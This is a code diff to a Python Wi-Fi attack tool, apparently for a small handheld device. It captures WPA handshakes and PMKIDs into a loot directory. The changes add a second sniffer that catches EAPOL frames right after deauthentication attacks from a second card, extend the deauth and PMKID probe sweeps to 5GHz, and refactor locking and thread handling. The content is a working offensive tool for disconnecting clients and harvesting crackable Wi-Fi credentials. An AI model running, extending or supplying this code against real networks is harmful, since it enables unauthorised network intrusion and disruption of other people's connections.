@@ -179,14 +179,12 @@ original_mac = ""
 
 # View
 view = "face"
+_scan_threads = []  # track scan threads to prevent duplicates
 
 # Animation state
 _blink = False
 _next_blink = time.time() + random.uniform(5, 10)
 _pupil_x = 0.0
-_pupil_target = 0
-_pupil_change_time = time.time() + random.uniform(2, 4)
-_zzz_phase = 0.0
 
 # Deauth backoff
 deauth_backoff = {}  # {bssid: {"count": int, "skip_until": float}}
@@ -220,15 +218,18 @@ def _load_stats():
 
 
 def _save_stats():
-    os.makedirs(LOOT_DIR, exist_ok=True)
-    with open(STATS_FILE, "w") as f:
-        json.dump({
-            "handshakes": lifetime_handshakes,
-            "half_hs": lifetime_half_hs,
-            "pmkid": lifetime_pmkid,
-            "networks": lifetime_networks,
-            "last_session": datetime.now().isoformat(),
-        }, f, indent=2)
+    try:
+        os.makedirs(LOOT_DIR, exist_ok=True)
+        with open(STATS_FILE, "w") as f:
+            json.dump({
+                "handshakes": lifetime_handshakes,
+                "half_hs": lifetime_half_hs,
+                "pmkid": lifetime_pmkid,
+                "networks": lifetime_networks,
+                "last_session": datetime.now().isoformat(),
+            }, f, indent=2)
+    except Exception:
+        pass
 
 
 def _load_config():
@@ -343,7 +344,7 @@ def _monitor_up(iface):
 def _monitor_down(iface):
     if not iface:
         return
-    base = iface.replace("mon", "")
+    base = iface[:-3] if iface.endswith("mon") else iface
     subprocess.run(["sudo", "airmon-ng", "stop", iface],
                    capture_output=True, timeout=10)
     for cmd in [
@@ -494,7 +495,7 @@ def _save_capture(bssid, essid, pkts, capture_type="hs"):
 
 
 def _finalize_capture(bssid, essid, pkts, capture_type, webhook_msg):
-    """Save capture pcap, update stats, send webhook. Called INSIDE lock."""
+    """Save capture pcap, update stats, send webhook. Called OUTSIDE lock."""
     save_pkts = []
     bcn = beacon_cache.get(bssid)
     if bcn:
@@ -643,13 +644,15 @@ def _packet_handler(pkt):
         dst = (pkt[Dot11].addr1 or "").upper()
         pair = tuple(sorted([src, dst]))
 
+        # Collect data under lock, finalize OUTSIDE lock (no I/O under lock)
+        pending_capture = None
+
         with lock:
             if pair not in eapol_buffer:
                 eapol_buffer[pair] = []
             eapol_buffer[pair].append(pkt)
             msg_count = len(eapol_buffer[pair])
 
-            # Find associated BSSID
             bssid = None
             for mac in pair:
                 if mac in session_aps:
@@ -684,11 +687,11 @@ def _packet_handler(pkt):
                                             last_capture_ssid = essid_pm
                                             last_capture_time = time.time()
                                             capture_flash = 30
-                                            _finalize_capture(
+                                            pending_capture = (
                                                 bssid, essid_pm, [pkt], "pmkid",
                                                 f"PMKID captured: {essid_pm} ({bssid})")
                                         break
-                                i += 2 + kde_len if kde_len > 0 else i + 2
+                                i += (2 + kde_len) if kde_len > 0 else 2
                 except Exception:
                     pass
 
@@ -696,7 +699,6 @@ def _packet_handler(pkt):
                 essid = session_aps.get(bssid, {}).get("essid", "unknown")
 
                 if msg_count >= 4:
-                    # Full 4-way handshake
                     captured_bssids.add(bssid)
                     session_handshakes += 1
                     lifetime_handshakes += 1
@@ -704,14 +706,17 @@ def _packet_handler(pkt):
                     last_capture_ssid = essid
                     last_capture_time = time.time()
                     capture_flash = 30
-                    _finalize_capture(
-                        bssid, essid, eapol_buffer[pair], "hs4",
+                    pending_capture = (
+                        bssid, essid, list(eapol_buffer[pair]), "hs4",
                         f"Full handshake: {essid} ({bssid}) saved as {{fname}}")
                     eapol_buffer[pair] = []
 
-            # Trim old buffers
             if msg_count > 8:
                 eapol_buffer[pair] = eapol_buffer[pair][-4:]
+
+        # Finalize OUTSIDE lock (disk I/O + webhook)
+        if pending_capture:
+            _finalize_capture(*pending_capture)
 
 
 # ---------------------------------------------------------------------------
@@ -729,6 +734,7 @@ def _half_hs_checker():
         if not _capture_event.is_set():
             break
 
+        pending_captures = []
         with lock:
             now = time.time()
             stale_pairs = []
@@ -761,9 +767,13 @@ def _half_hs_checker():
                     last_capture_ssid = essid
                     last_capture_time = now
                     capture_flash = 20
-                    _finalize_capture(
+                    pending_captures.append((
                         bssid, essid, pkts, "hs_half",
-                        f"Half handshake ({len(pkts)} msgs): {essid}")
+                        f"Half handshake ({len(pkts)} msgs): {essid}"))
+
+        # Finalize OUTSIDE lock
+        for cap in pending_captures:
+            _finalize_capture(*cap)
 
 
 # ---------------------------------------------------------------------------
@@ -983,24 +993,27 @@ def _channel_hopper():
 
     while not _shutdown.is_set() and _capture_event.is_set():
 
-        # ---- DUAL MODE: follow attacker signals ----
+        # ---- DUAL MODE: follow attacker signals, passive scan between ----
         if dual_mode:
-            signaled = _attack_signal.wait(timeout=10)
+            signaled = _attack_signal.wait(timeout=3)
             if _shutdown.is_set() or not _capture_event.is_set():
                 return
             if signaled:
                 _attack_signal.clear()
-                ch = attack_ch_target
+                with lock:
+                    ch = attack_ch_target
                 _hop_channel(mon_iface, ch, checked_5g, supported_5g)
+                # Long dwell to capture EAPOL after deauth
                 if not _dwell(DWELL_DUAL_CAPTURE):
                     return
             else:
-                # No signal — slow discovery on priority channels
+                # No signal — passive scan on priority channels + PMKID probes
                 for ch in CHANNELS_24_PRIORITY:
                     if _shutdown.is_set() or not _capture_event.is_set():
                         return
                     if _hop_channel(mon_iface, ch, checked_5g, supported_5g):
-                        if not _dwell(5):
+                        _do_pmkid_probes(ch, mon_iface)
+                        if not _dwell(3):
                             return
             continue
 
@@ -1071,11 +1084,13 @@ def _channel_hopper():
 
 
 def _attack_hopper():
-    """Dual mode: fast channel hop + deauth on secondary card.
+    """Dual mode: fast channel hop + deauth + PMKID probe on secondary card.
 
     Signals the primary sniffer to follow for capture.
+    Covers both 2.4GHz and 5GHz channels.
     """
     global attack_ch_target
+    all_channels = CHANNELS_24_ALL + CHANNELS_5
 
     while not _shutdown.is_set() and _capture_event.is_set():
         with lock:
@@ -1110,8 +1125,9 @@ def _attack_hopper():
                 if r.returncode != 0:
                     continue
 
-                # Signal sniffer to follow
-                attack_ch_target = ch
+                # Signal sniffer to follow to this channel
+                with lock:
+                    attack_ch_target = ch
                 _attack_signal.set()
 
                 # Deauth from attacker card
@@ -1125,17 +1141,32 @@ def _attack_hopper():
                 if not clients and essid:
                     _active_pmkid_probe(bssid, essid, mon_iface2)
 
-                time.sleep(1.5)
+                time.sleep(1.0)
         else:
-            # No targets: fast discovery sweep
-            for ch in CHANNELS_24_ALL:
+            # No targets: fast discovery sweep (2.4 + 5GHz)
+            for ch in all_channels:
                 if _shutdown.is_set() or not _capture_event.is_set():
                     return
                 subprocess.run(
                     ["sudo", "iw", "dev", mon_iface2, "set", "channel", str(ch)],
                     capture_output=True, timeout=3,
                 )
-                time.sleep(0.5)
+                time.sleep(0.3)
+
+
+def _sniffer2():
+    """Second sniffer on mon_iface2 (dual mode) — captures EAPOL after deauth."""
+    if not SCAPY_OK or not mon_iface2:
+        return
+    try:
+        scapy_sniff(
+            iface=mon_iface2,
+            prn=_packet_handler,
+            stop_filter=lambda _: _shutdown.is_set() or not _capture_event.is_set(),
+            store=0,
+        )
+    except Exception:
+        pass
 
 
 def _sniffer():
@@ -1190,11 +1221,9 @@ def _activity_sampler():
 
 
 def _update_animation():
-    global _blink, _next_blink, _pupil_x, _pupil_target
-    global _pupil_change_time, _zzz_phase
+    global _blink, _next_blink
 
     now = time.time()
-
     if _blink:
         if now > _next_blink + 0.2:
             _blink = False
@@ -1202,14 +1231,6 @@ def _update_animation():
     else:
         if now >= _next_blink:
             _blink = True
-
-    if now >= _pupil_change_time:
-        _pupil_target = random.randint(-2, 2)
-        _pupil_change_time = now + random.uniform(2, 4)
-    diff = _pupil_target - _pupil_x
-    _pupil_x += diff * 0.3
-
-    _zzz_phase = (now * 0.5) % 3.0
 
 
 # ---------------------------------------------------------------------------
@@ -1524,12 +1545,20 @@ def _draw_stats(lcd, font_obj, font_sm, scroll):
 # ---------------------------------------------------------------------------
 
 
+_captures_cache = {"files": [], "ts": 0}
+
 def _list_captures():
+    # Cache for 3 seconds to avoid os.listdir every frame
+    now = time.time()
+    if now - _captures_cache["ts"] < 3 and _captures_cache["files"]:
+        return _captures_cache["files"]
+    _captures_cache["ts"] = now
     if not os.path.isdir(HANDSHAKE_DIR):
         return []
     try:
         files = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".pcap")]
         files.sort(reverse=True)
+        _captures_cache["files"] = files
         return files
     except Exception:
         return []
@@ -1741,15 +1770,24 @@ def main():
 
             elif btn == "OK":
                 if not _capture_event.is_set():
-                    _capture_event.set()
-                    threading.Thread(target=_channel_hopper,
-                                    daemon=True).start()
-                    threading.Thread(target=_sniffer, daemon=True).start()
-                    threading.Thread(target=_half_hs_checker,
-                                    daemon=True).start()
-                    if dual_mode and mon_iface2:
-                        threading.Thread(target=_attack_hopper,
-                                        daemon=True).start()
+                    # Only start threads if none are alive
+                    alive = any(t.is_alive() for t in _scan_threads)
+                    if not alive:
+                        _scan_threads.clear()
+                        _capture_event.set()
+                        for target in [_channel_hopper, _sniffer, _half_hs_checker]:
+                            t = threading.Thread(target=target, daemon=True)
+                            t.start()
+                            _scan_threads.append(t)
+                        if dual_mode and mon_iface2:
+                            # Attack hopper on card 2
+                            t = threading.Thread(target=_attack_hopper, daemon=True)
+                            t.start()
+                            _scan_threads.append(t)
+                            # Second sniffer on card 2 (captures EAPOL right after deauth)
+                            t = threading.Thread(target=_sniffer2, daemon=True)
+                            t.start()
+                            _scan_threads.append(t)
                 else:
                     _capture_event.clear()
                 time.sleep(0.3)
